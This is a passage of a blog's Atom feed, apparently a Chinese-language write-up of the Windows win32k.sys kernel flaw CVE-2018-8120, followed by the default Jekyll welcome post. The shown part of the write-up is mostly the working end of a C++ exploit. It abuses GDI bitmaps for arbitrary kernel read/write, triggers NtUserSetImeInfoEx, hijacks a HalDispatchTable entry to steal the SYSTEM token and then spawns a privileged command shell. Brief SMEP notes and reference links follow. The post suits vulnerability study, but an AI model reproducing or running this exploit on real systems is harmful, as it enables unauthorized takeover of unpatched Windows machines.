</span>		<span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"GetLastError value: "</span> <span class="o">&lt;&lt;</span> <span class="n">showbase</span> <span class="o">&lt;&lt;</span> <span class="n">hex</span> <span class="o">&lt;&lt;</span> <span class="n">GetLastError</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">else</span> <span class="p">{</span>
		<span class="n">RepoSuccess</span><span class="p">(</span><span class="s">"Find HalDispatchTable Success!"</span><span class="p">);</span>
	
<span class="cp">#endif // DEBUG
</span>	<span class="p">}</span>

	<span class="n">HalDispatchTable</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)((</span><span class="n">DWORD</span><span class="p">)</span><span class="n">HalDispatchTable</span> <span class="o">-</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">hNtoskrnl</span> <span class="o">+</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">NtoskrnlBase</span><span class="p">);</span>
	<span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[*] HalDispatchTable: "</span> <span class="o">&lt;&lt;</span> <span class="n">showbase</span> <span class="o">&lt;&lt;</span> <span class="n">hex</span> <span class="o">&lt;&lt;</span> <span class="n">HalDispatchTable</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>

	<span class="cm">/* 分配零页虚拟内存 */</span>
	<span class="k">auto</span> <span class="n">NtAllocateVirutalMemory</span> <span class="o">=</span> <span class="p">(</span><span class="n">pNtAllocateVirtualMemory</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">hNtdll</span><span class="p">,</span> <span class="s">"NtAllocateVirtualMemory"</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">GetLastError</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">RepoErrorExit</span><span class="p">(</span><span class="s">"Cannot find NtAllocateVirtualMemory..."</span><span class="p">);</span>
	<span class="p">}</span>
<span class="cp">#ifdef DEBUG
</span>	<span class="k">else</span> <span class="p">{</span>
		<span class="n">RepoSuccess</span><span class="p">(</span><span class="s">"Find NtAllocateVirtualMemory Success!"</span><span class="p">);</span>
	<span class="p">}</span>
<span class="cp">#endif
</span>	<span class="n">DWORD</span> <span class="n">BaseAddr</span> <span class="o">=</span> <span class="mh">0x2</span><span class="p">;</span>
	<span class="n">DWORD</span> <span class="n">RegionSize</span> <span class="o">=</span> <span class="mh">0x1000</span><span class="p">;</span>
	<span class="n">NtAllocateVirutalMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="o">&amp;</span><span class="n">BaseAddr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">RegionSize</span><span class="p">,</span> <span class="n">MEM_RESERVE</span> <span class="o">|</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
	<span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="mi">1024</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x90</span> <span class="p">};</span>
	<span class="n">HBITMAP</span> <span class="n">hWorker</span> <span class="o">=</span> <span class="n">CreateBitmap</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="n">buff</span><span class="p">);</span>
	<span class="n">HBITMAP</span> <span class="n">hManager</span> <span class="o">=</span> <span class="n">CreateBitmap</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="n">buff</span><span class="p">);</span>
	<span class="k">constexpr</span> <span class="n">DWORD</span> <span class="n">GdiSharedHandleTable_offset</span> <span class="o">=</span> <span class="mh">0x094</span><span class="p">;</span>
	<span class="n">DWORD</span> <span class="n">peb</span> <span class="o">=</span> <span class="n">GetPeb</span><span class="p">();</span>
	<span class="n">pGdiCell</span> <span class="n">GdiHandleTable</span> <span class="o">=</span> <span class="p">(</span><span class="n">pGdiCell</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)((</span><span class="kt">char</span><span class="o">*</span><span class="p">)(</span><span class="n">peb</span> <span class="o">+</span> <span class="n">GdiSharedHandleTable_offset</span><span class="p">));</span>
	<span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[*] GdiHandleTable: "</span> <span class="o">&lt;&lt;</span> <span class="n">showbase</span> <span class="o">&lt;&lt;</span> <span class="n">hex</span> <span class="o">&lt;&lt;</span> <span class="n">GdiHandleTable</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
	<span class="n">pGdiCell</span> <span class="n">work_cell</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">GdiHandleTable</span><span class="p">[(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">hWorker</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">];</span>
	<span class="n">pGdiCell</span> <span class="n">manage_cell</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">GdiHandleTable</span><span class="p">[(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">hManager</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">];</span>
	<span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[*] worker GdiCell: "</span> <span class="o">&lt;&lt;</span> <span class="n">showbase</span> <span class="o">&lt;&lt;</span> <span class="n">hex</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">work_cell</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
	<span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[*] manager GdiCell: "</span> <span class="o">&lt;&lt;</span> <span class="n">showbase</span> <span class="o">&lt;&lt;</span> <span class="n">hex</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">manage_cell</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
	<span class="n">PVOID</span> <span class="n">worker_krnl_addr</span> <span class="o">=</span> <span class="n">work_cell</span><span class="o">-&gt;</span><span class="n">pKernelAddress</span><span class="p">;</span>
	<span class="n">PVOID</span> <span class="n">manager_krnl_addr</span> <span class="o">=</span> <span class="n">manage_cell</span><span class="o">-&gt;</span><span class="n">pKernelAddress</span><span class="p">;</span>
	<span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[*] worker kernel address: "</span> <span class="o">&lt;&lt;</span> <span class="n">showbase</span> <span class="o">&lt;&lt;</span> <span class="n">hex</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">worker_krnl_addr</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
	<span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[*] manager kernel address: "</span> <span class="o">&lt;&lt;</span> <span class="n">showbase</span> <span class="o">&lt;&lt;</span> <span class="n">hex</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">manager_krnl_addr</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
	<span class="n">DWORD</span> <span class="n">surfobj_offset</span> <span class="o">=</span> <span class="mh">0x10</span><span class="p">;</span>
	<span class="n">DWORD</span> <span class="n">pvscan0_offset</span> <span class="o">=</span> <span class="mh">0x20</span><span class="p">;</span>
	<span class="n">DWORD</span> <span class="n">w_pvscan0</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">worker_krnl_addr</span> <span class="o">+</span> <span class="n">surfobj_offset</span> <span class="o">+</span> <span class="n">pvscan0_offset</span><span class="p">;</span>
	<span class="n">DWORD</span> <span class="n">m_pvscan0</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">manager_krnl_addr</span> <span class="o">+</span> <span class="n">surfobj_offset</span> <span class="o">+</span> <span class="n">pvscan0_offset</span><span class="p">;</span>
	<span class="kt">char</span> <span class="n">payload</span><span class="p">[</span><span class="mi">512</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
<span class="cp">#define API_BITMAP 0x04000000
#define SHAREACCESS_SURFACE 0x00000200
#define DDB_SURFACE 0x00800000
#define STYPE_BITMAP 0L
#define BMF_TOPDOWN 0x1
#define BMF_32BPP 0x6
</span>	<span class="n">PDWORD</span> <span class="n">p</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">payload</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
	<span class="n">p</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">w_pvscan0</span><span class="p">;</span>           <span class="c1">// pvScan0 : Worker pvScan0</span>
	<span class="n">p</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x180</span><span class="p">;</span>               <span class="c1">// lDelta : 0x180</span>
	<span class="n">p</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xabcd</span><span class="p">;</span>              <span class="c1">// iUniq : 0xabcd</span>
	<span class="n">p</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">BMF_32BPP</span><span class="p">;</span>           <span class="c1">// iBitmapFormat : BMF_32BPP</span>
	<span class="n">p</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">STYPE_BITMAP</span><span class="p">;</span>        <span class="c1">// iType : STYPE_BITMAP</span>
	<span class="n">p</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">|=</span> <span class="n">BMF_TOPDOWN</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">;</span>  <span class="c1">// fjBitmap : BMF_TOPDOWN</span>
	<span class="n">p</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x4800200</span><span class="p">;</span>           <span class="c1">// flags : API_BITMAP | SHAREACCESS_SURFACE | DDB_SURFACE</span>

	<span class="n">PDWORD</span> <span class="n">tmp</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">tmp</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">=</span> <span class="n">m_pvscan0</span><span class="p">;</span>   <span class="c1">// arbitrary write addr : Manager pvScan0</span>
	<span class="n">tmp</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="n">w_pvscan0</span><span class="p">;</span>  <span class="c1">// if ( v3[5] != *a2 ) {...} bypass</span>
	<span class="n">HWINSTA</span> <span class="n">hWinsta</span> <span class="o">=</span> <span class="n">CreateWindowStationA</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">READ_CONTROL</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
	<span class="n">SetProcessWindowStation</span><span class="p">(</span><span class="n">hWinsta</span><span class="p">);</span>
	<span class="n">NtUserSetImeInfoEx</span><span class="p">(</span><span class="n">payload</span><span class="p">);</span>
	<span class="n">RepoSuccess</span><span class="p">(</span><span class="s">"Exploit Success!"</span><span class="p">);</span>
	<span class="n">DWORD</span> <span class="n">oldHalEntry</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="n">ReadOOB</span><span class="p">(</span><span class="n">hManager</span><span class="p">,</span> <span class="n">hWorker</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">HalDispatchTable</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldHalEntry</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
	<span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"[*] oldHalEntry: "</span> <span class="o">&lt;&lt;</span> <span class="n">showbase</span> <span class="o">&lt;&lt;</span> <span class="n">hex</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">oldHalEntry</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
	<span class="n">DWORD</span> <span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">GetSystemToken</span><span class="p">;</span>
	<span class="c1">//getchar();</span>
	<span class="n">WriteOOB</span><span class="p">(</span><span class="n">hManager</span><span class="p">,</span> <span class="n">hWorker</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">HalDispatchTable</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">shellcode</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
	<span class="n">_NtQueryIntervalProfile</span> <span class="n">NtQueryIntervalProfile</span><span class="p">;</span>
	<span class="n">ULONG</span> <span class="n">Interval</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="n">NtQueryIntervalProfile</span> <span class="o">=</span> <span class="p">(</span><span class="n">_NtQueryIntervalProfile</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">hNtdll</span><span class="p">,</span><span class="s">"NtQueryIntervalProfile"</span><span class="p">);</span>
	<span class="n">NtQueryIntervalProfile</span><span class="p">(</span><span class="mh">0x1337</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Interval</span><span class="p">);</span>
	<span class="n">WriteOOB</span><span class="p">(</span><span class="n">hManager</span><span class="p">,</span> <span class="n">hWorker</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">HalDispatchTable</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldHalEntry</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
	<span class="n">system</span><span class="p">(</span><span class="s">"cmd"</span><span class="p">);</span>
	<span class="c1">//getchar();</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="通过覆盖palette对象实现任意地址读写">通过覆盖Palette对象实现任意地址读写</h3>

<p>// to do</p>

<p>也可以通过其他方式劫持执行流</p>

<h3 id="通过劫持窗口对象lpfnwndproc成员执行用户代码">通过劫持窗口对象lpfnWndProc成员执行用户代码</h3>

<p>// to do</p>

<h3 id="smep">SMEP</h3>

<p>可以通过微软的<code class="language-plaintext highlighter-rouge">Coreinfo.exe</code> 工具查看电脑保护情况.</p>

<p>为<code class="language-plaintext highlighter-rouge">*</code>则代表开启, 为<code class="language-plaintext highlighter-rouge">-</code>则代表未开启.</p>

<p><code class="language-plaintext highlighter-rouge">SMEP</code> 由<code class="language-plaintext highlighter-rouge">Cr3</code> 寄存器控制</p>

<p>比较疑惑的是使用的<code class="language-plaintext highlighter-rouge">win7</code>虚拟机显示开启了<code class="language-plaintext highlighter-rouge">smep</code>，但是也可以直接返回用户层代码利用成功。</p>

<h2 id="参考文章">参考文章</h2>

<p><a href="https://021w.github.io/2021/02/24/CVE-2018-8120win32k-sys%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">CVE-2018-8120win32k.sys内核漏洞分析</a></p>

<p><a href="https://www.freebuf.com/vuls/174182.html">关于CVE-2018-8120 之最新Windows提权漏洞分析 - FreeBuf网络安全行业门户</a></p>

<p><a href="https://www.cnblogs.com/DreamoneOnly/p/11444172.html">CVE-2018-8120</a></p>]]></content><author><name></name></author><category term="windows" /><summary type="html"><![CDATA[漏洞原因]]></summary></entry><entry><title type="html">My Blog!</title><link href="http://localhost:4000/jekyll/update/2020/10/05/welcome-to-jekyll.html" rel="alternate" type="text/html" title="My Blog!" /><published>2020-10-05T00:20:22+08:00</published><updated>2020-10-05T00:20:22+08:00</updated><id>http://localhost:4000/jekyll/update/2020/10/05/welcome-to-jekyll</id><content type="html" xml:base="http://localhost:4000/jekyll/update/2020/10/05/welcome-to-jekyll.html"><![CDATA[<p>You’ll find this post in your <code class="language-plaintext highlighter-rouge">_posts</code> directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run <code class="language-plaintext highlighter-rouge">jekyll serve</code>, which launches a web server and auto-regenerates your site when a file is updated.</p>

<p>Jekyll requires blog post files to be named according to the following format:</p>

<p><code class="language-plaintext highlighter-rouge">YEAR-MONTH-DAY-title.MARKUP</code></p>

<p>Where <code class="language-plaintext highlighter-rouge">YEAR</code> is a four-digit number, <code class="language-plaintext highlighter-rouge">MONTH</code> and <code class="language-plaintext highlighter-rouge">DAY</code> are both two-digit numbers, and <code class="language-plaintext highlighter-rouge">MARKUP</code> is the file extension representing the format used in the file. After that, include the necessary front matter. Take a look at the source for this post to get an idea about how it works.</p>

<p>Jekyll also offers powerful support for code snippets:</p>

<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="k">def</span> <span class="nf">print_hi</span><span class="p">(</span><span class="nb">name</span><span class="p">)</span>
  <span class="nb">puts</span> <span class="s2">"Hi, </span><span class="si">#{</span><span class="nb">name</span><span class="si">}</span><span class="s2">"</span>
<span class="k">end</span>
<span class="n">print_hi</span><span class="p">(</span><span class="s1">'Tom'</span><span class="p">)</span>
<span class="c1">#=&gt; prints 'Hi, Tom' to STDOUT.</span></code></pre></figure>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Hello World"</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span>
<span class="p">}</span>
</code></pre></div></div>

<p>中文测试，你好
Check out the <a href="https://jekyllrb.com/docs/home">Jekyll docs</a> for more info on how to get the most out of Jekyll. File all bugs/feature requests at <a href="https://github.com/jekyll/jekyll">Jekyll’s GitHub repo</a>. If you have questions, you can ask them on <a href="https://talk.jekyllrb.com/">Jekyll Talk</a>.</p>]]></content><author><name></name></author><category term="jekyll" /><category term="update" /><summary type="html"><![CDATA[You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated.]]></summary></entry></feed>